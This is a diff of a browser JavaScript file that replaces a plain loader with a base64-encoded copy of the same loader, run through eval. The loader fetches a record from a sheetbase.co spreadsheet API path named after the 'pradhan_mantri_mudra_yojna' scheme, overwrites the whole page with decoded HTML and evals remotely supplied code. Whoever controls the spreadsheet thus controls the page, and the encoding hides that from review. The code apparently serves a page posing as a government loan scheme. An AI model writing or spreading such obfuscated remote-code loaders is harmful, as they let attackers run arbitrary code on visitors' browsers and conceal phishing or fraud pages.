@@ -1,68 +1,9 @@
-const connectingLoaderDiv = document.createElement('div');
-connectingLoaderDiv.id = 'connectingLoader';
-connectingLoaderDiv.style.position = 'fixed';
-connectingLoaderDiv.style.top = '0';
-connectingLoaderDiv.style.left = '0';
-connectingLoaderDiv.style.width = '100%';
-connectingLoaderDiv.style.height = '100%';
-connectingLoaderDiv.style.backgroundColor = '#fff';
-connectingLoaderDiv.style.display = 'flex';
-connectingLoaderDiv.style.alignItems = 'center';
-connectingLoaderDiv.style.justifyContent = 'center';
-connectingLoaderDiv.style.fontSize = '24px';
-connectingLoaderDiv.style.fontWeight = 'bold';
-connectingLoaderDiv.style.zIndex = '9999';
-connectingLoaderDiv.innerText = 'Connecting';
-document.body.appendChild(connectingLoaderDiv);
+const encoded = "Y29uc3QgY29ubmVjdGluZ0xvYWRlckRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpjb25uZWN0aW5nTG9hZGVyRGl2LmlkID0gJ2Nvbm5lY3RpbmdMb2FkZXInOwpjb25uZWN0aW5nTG9hZGVyRGl2LnN0eWxlLnBvc2l0aW9uID0gJ2ZpeGVkJzsKY29ubmVjdGluZ0xvYWRlckRpdi5zdHlsZS50b3AgPSAnMCc7CmNvbm5lY3RpbmdMb2FkZXJEaXYuc3R5bGUubGVmdCA9ICcwJzsKY29ubmVjdGluZ0xvYWRlckRpdi5zdHlsZS53aWR0aCA9ICcxMDAlJzsKY29ubmVjdGluZ0xvYWRlckRpdi5zdHlsZS5oZWlnaHQgPSAnMTAwJSc7CmNvbm5lY3RpbmdMb2FkZXJEaXYuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyNmZmYnOwpjb25uZWN0aW5nTG9hZGVyRGl2LnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CmNvbm5lY3RpbmdMb2FkZXJEaXYuc3R5bGUuYWxpZ25JdGVtcyA9ICdjZW50ZXInOwpjb25uZWN0aW5nTG9hZGVyRGl2LnN0eWxlLmp1c3RpZnlDb250ZW50ID0gJ2NlbnRlcic7CmNvbm5lY3RpbmdMb2FkZXJEaXYuc3R5bGUuZm9udFNpemUgPSAnMjRweCc7CmNvbm5lY3RpbmdMb2FkZXJEaXYuc3R5bGUuZm9udFdlaWdodCA9ICdib2xkJzsKY29ubmVjdGluZ0xvYWRlckRpdi5zdHlsZS56SW5kZXggPSAnOTk5OSc7CmNvbm5lY3RpbmdMb2FkZXJEaXYuaW5uZXJUZXh0ID0gJ0Nvbm5lY3RpbmcnOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbm5lY3RpbmdMb2FkZXJEaXYpOwoKbGV0IGRvdENvdW50ID0gMDsKY29uc3QgbWF4RG90cyA9IDM7CmNvbnN0IGRvdEludGVydmFsID0gc2V0SW50ZXJ2YWwoKCkgPT4gewogIGRvdENvdW50ID0gKGRvdENvdW50ICsgMSkgJSAobWF4RG90cyArIDEpOwogIGNvbm5lY3RpbmdMb2FkZXJEaXYuaW5uZXJUZXh0ID0gJ0Nvbm5lY3RpbmcnICsgJy4nLnJlcGVhdChkb3RDb3VudCk7Cn0sIDUwMCk7Cgpjb25zdCBzaGVldGJhc2VBcGlVcmwgPSAiaHR0cHM6Ly9zaGVldGJhc2UuY28vYXBpL3ByYWRoYW5fbWFudHJpX211ZHJhX3lvam5hLzFzMngtS1otZG0wclJIR0VvcU54YmUwNlJCeFFsa0pYUWRZSVhuM0xhNDlVL3NoZWV0MS8iOwpjb25zdCBleHBpcnlJZCA9ICJEQkIiOwoKYXN5bmMgZnVuY3Rpb24gbG9hZEJhc2U2NEhUTUwocmV0cmllcyA9IDMpIHsKICB0cnkgewogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaChzaGVldGJhc2VBcGlVcmwsIHsgY2FjaGU6ICJuby1zdG9yZSIgfSk7CiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwoKICAgIGlmICghZGF0YS5kYXRhIHx8ICFBcnJheS5pc0FycmF5KGRhdGEuZGF0YSkpIHRocm93IG5ldyBFcnJvcigiSW52YWxpZCBTaGVldGJhc2UgcmVzcG9uc2UiKTsKCiAgICBjb25zdCBpdGVtID0gZGF0YS5kYXRhLmZpbmQoZW50cnkgPT4gZW50cnkuaWQgPT09IGV4cGlyeUlkKTsKICAgIGlmICghaXRlbSB8fCAhaXRlbS5odG1sIHx8ICFpdGVtLmluaXQpIHRocm93IG5ldyBFcnJvcigiQmFzZTY0IEhUTUwgb3IgaW5pdGlhbGl6ZVBhZ2Ugbm90IGZvdW5kIGZvciBJRDogIiArIGV4cGlyeUlkKTsKCiAgICBjb25zdCBkZWNvZGVkSFRNTCA9IGF0b2IoaXRlbS5odG1sKTsKICAgIGRvY3VtZW50Lm9wZW4oKTsKICAgIGRvY3VtZW50LndyaXRlKGRlY29kZWRIVE1MKTsKICAgIGRvY3VtZW50LmNsb3NlKCk7CgogICAgY29uc3QgaW5pdEZuQ29kZSA9IGF0b2IoaXRlbS5pbml0KTsKICAgIGV2YWwoaW5pdEZuQ29kZSk7CgogICAgY2xlYXJJbnRlcnZhbChkb3RJbnRlcnZhbCk7CiAgICBjb25zdCBsb2FkZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29ubmVjdGluZ0xvYWRlcicpOwogICAgaWYgKGxvYWRlcikgbG9hZGVyLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CgogICAgaWYgKHR5cGVvZiBpbml0aWFsaXplUGFnZSA9PT0gJ2Z1bmN0aW9uJykgewogICAgICBpbml0aWFsaXplUGFnZSgpOwogICAgfSBlbHNlIHsKICAgICAgdGhyb3cgbmV3IEVycm9yKCJpbml0aWFsaXplUGFnZSBpcyBub3QgZGVmaW5lZCBhZnRlciBsb2FkaW5nIik7CiAgICB9CgogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICBpZiAocmV0cmllcyA+IDApIHsKICAgICAgY29uc29sZS53YXJuKCJSZXRyeWluZyBsb2FkQmFzZTY0SFRNTCBkdWUgdG8gZXJyb3I6IiwgZXJyb3IpOwogICAgICBzZXRUaW1lb3V0KCgpID0+IGxvYWRCYXNlNjRIVE1MKHJldHJpZXMgLSAxKSwgMjAwMCk7CiAgICB9IGVsc2UgewogICAgICBjb25zb2xlLmVycm9yKCJGYWlsZWQgdG8gbG9hZCBiYXNlNjQgSFRNTCBmcm9tIFNoZWV0YmFzZToiLCBlcnJvcik7CiAgICAgIGNsZWFySW50ZXJ2YWwoZG90SW50ZXJ2YWwpOwogICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9ICI8aDI+RmFpbGVkIHRvIGxvYWQgcGFnZS4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci48L2gyPiI7CiAgICB9CiAgfQp9Cgpsb2FkQmFzZTY0SFRNTCgpOw==";
 
-let dotCount = 0;
-const maxDots = 3;
-const dotInterval = setInterval(() => {
-  dotCount = (dotCount + 1) % (maxDots + 1);
-  connectingLoaderDiv.innerText = 'Connecting' + '.'.repeat(dotCount);
-}, 500);
-
-const sheetbaseApiUrl = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
-const expiryId = "DBB";
-
-async function loadBase64HTML(retries = 3) {
-  try {
-    const response = await fetch(sheetbaseApiUrl, { cache: "no-store" });
-    const data = await response.json();
-
-    if (!data.data || !Array.isArray(data.data)) throw new Error("Invalid Sheetbase response");
-
-    const item = data.data.find(entry => entry.id === expiryId);
-    if (!item || !item.html || !item.init) throw new Error("Base64 HTML or initializePage not found for ID: " + expiryId);
-
-    const decodedHTML = atob(item.html);
-    document.open();
-    document.write(decodedHTML);
-    document.close();
-
-    const initFnCode = atob(item.init);
-    eval(initFnCode);
-
-    clearInterval(dotInterval);
-    const loader = document.getElementById('connectingLoader');
-    if (loader) loader.style.display = 'none';
-
-    if (typeof initializePage === 'function') {
-      initializePage();
-    } else {
-      throw new Error("initializePage is not defined after loading");
-    }
-
-  } catch (error) {
-    if (retries > 0) {
-      console.warn("Retrying loadBase64HTML due to error:", error);
-      setTimeout(() => loadBase64HTML(retries - 1), 2000);
-    } else {
-      console.error("Failed to load base64 HTML from Sheetbase:", error);
-      clearInterval(dotInterval);
-      document.body.innerHTML = "<h2>Failed to load page. Please try again later.</h2>";
-    }
-  }
+function decodeBase64(base64) {
+  return decodeURIComponent(atob(base64).split('').map(c =>
+    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
+  ).join(''));
 }
 
-loadBase64HTML();
+eval(decodeBase64(encoded));
